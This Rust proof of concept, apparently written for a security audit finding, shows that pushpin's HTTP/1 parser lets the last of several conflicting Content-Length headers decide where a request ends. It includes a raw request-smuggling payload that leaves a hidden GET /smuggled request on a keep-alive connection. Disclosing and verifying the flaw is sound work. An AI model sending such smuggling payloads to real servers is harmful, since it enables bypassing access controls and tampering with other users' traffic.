// PoC for finding 012: src/core/http1/protocol.rs:1128 unconditionally
// overwrites content_len for every Content-Length header it sees, so for a
// request that carries two conflicting Content-Length values the *last*
// value wins. A peer that picks the first value (or rejects duplicates)
// disagrees on the request boundary -- the request smuggling primitive.
//
// This PoC uses httparse (the same parser pushpin uses) and copies the exact
// header loop from ServerProtocol::process_request verbatim. The output
// reports which Content-Length value the parser selected and how many body
// bytes it would consume, leaving the rest as a smuggled second request on
// the persistent connection.

use std::str;

#[derive(Debug)]
enum Error {
    InvalidContentLength,
    UnsupportedTransferEncoding,
}

#[derive(Debug, PartialEq)]
enum BodySize {
    NoBody,
    Known(usize),
    Unknown,
}

fn parse_as_int(src: &[u8]) -> Result<usize, ()> {
    str::from_utf8(src).map_err(|_| ())?.parse().map_err(|_| ())
}

// Verbatim copy of the vulnerable loop at src/core/http1/protocol.rs:1118-1149.
fn process_request(req: &httparse::Request) -> Result<(BodySize, bool), Error> {
    let _version = req.version.unwrap();

    let mut content_len: Option<usize> = None;
    let mut chunked = false;

    for i in 0..req.headers.len() {
        let h = req.headers[i];

        if h.name.eq_ignore_ascii_case("Content-Length") {
            let len = match parse_as_int(h.value) {
                Ok(len) => len,
                Err(_) => return Err(Error::InvalidContentLength),
            };

            // No equality check against any prior parsed value. Whatever
            // came last wins.
            content_len = Some(len);
        } else if h.name.eq_ignore_ascii_case("Transfer-Encoding") {
            if h.value == b"chunked" {
                chunked = true;
            } else {
                return Err(Error::UnsupportedTransferEncoding);
            }
        }
    }

    let body_size = if chunked {
        BodySize::Unknown
    } else if let Some(len) = content_len {
        BodySize::Known(len)
    } else {
        BodySize::NoBody
    };

    let chunk_left = match body_size {
        BodySize::Known(len) => len,
        _ => 0,
    };

    Ok((body_size, chunk_left != 0))
}

fn main() {
    // The smuggling payload. The first Content-Length is 5 ("abcGE"),
    // the second is 3 ("abc"). pushpin selects 3 and reads only "abc"
    // as the body, leaving "GET /smuggled ..." behind in the read buffer
    // for keep-alive reuse.
    let raw: &[u8] = b"\
POST / HTTP/1.1\r\n\
Host: example\r\n\
Content-Length: 5\r\n\
Content-Length: 3\r\n\
\r\n\
abcGET /smuggled HTTP/1.1\r\n\
Host: example\r\n\
\r\n";

    let mut headers = [httparse::EMPTY_HEADER; 32];
    let mut req = httparse::Request::new(&mut headers);

    let header_end = match req.parse(raw).expect("httparse") {
        httparse::Status::Complete(n) => n,
        httparse::Status::Partial => panic!("partial parse"),
    };

    let (body_size, _) = process_request(&req).expect("process_request");

    let body_len = match body_size {
        BodySize::Known(n) => n,
        other => panic!("unexpected body size: {:?}", other),
    };

    let body = &raw[header_end..header_end + body_len];
    let leftover = &raw[header_end + body_len..];

    println!("Content-Length headers seen   : 2 (values 5, 3)");
    println!("Parser-selected body size     : {} bytes", body_len);
    println!("Bytes consumed as request body: {:?}", str::from_utf8(body).unwrap());
    println!("Bytes left on connection      : {:?}", str::from_utf8(leftover).unwrap());

    // The smuggled bytes are a syntactically valid second HTTP request that
    // will be parsed on the next keep-alive iteration.
    let mut headers2 = [httparse::EMPTY_HEADER; 32];
    let mut smuggled = httparse::Request::new(&mut headers2);
    let parsed = smuggled.parse(leftover).expect("smuggled parse");
    let smuggled_complete = matches!(parsed, httparse::Status::Complete(_));

    println!(
        "Leftover parses as a smuggled request? {} (method={:?}, path={:?})",
        smuggled_complete,
        smuggled.method.unwrap_or(""),
        smuggled.path.unwrap_or("")
    );

    let vulnerable = body_len == 3 && body == b"abc"
        && smuggled_complete
        && smuggled.method == Some("GET")
        && smuggled.path == Some("/smuggled");

    if vulnerable {
        println!("\nRESULT: vulnerable. Last Content-Length wins (3); the bytes a");
        println!("        front-end peer that picks 5 would have included in the body");
        println!("        instead become a second request on the keep-alive connection.");
        std::process::exit(0);
    } else {
        println!("\nRESULT: did not reproduce");
        std::process::exit(1);
    }
}
